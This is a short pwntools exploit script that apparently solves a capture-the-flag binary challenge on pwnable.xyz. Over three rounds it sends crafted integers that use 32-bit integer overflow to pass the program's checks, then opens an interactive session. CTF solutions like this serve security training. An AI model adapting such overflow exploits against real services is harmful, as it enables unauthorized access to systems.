from pwn import *

exe = ELF("./challenge", checksec=True)

context.binary = exe

HOST = "svc.pwnable.xyz"
PORT = 30008

gdbscript = """
set follow-fork-mode child
"""

args.LOCAL = True
args.DEBUG = True

def conn():
    if args.LOCAL:
        r = process(exe.path)
        if args.DEBUG:
            gdb.attach(r, gdbscript=gdbscript)
    else:
        r = remote(HOST, PORT)

    return r

def round1(r):
    r.sendlineafter(b"x: ", b"1336")
    r.sendlineafter(b"y: ", str((1 << 32) - 1).encode())

def round2(r):
    x = 3
    y = ((1 << 32) + 1337) // 3
    
    r.sendline(f"{x} {y}".encode())

def round3(r):
    r.sendline(b"0 " * 5)

def main():
    r  = conn()

    round1(r)
    round2(r)
    round3(r)
    
    r.interactive()

if __name__ == "__main__":
    main()
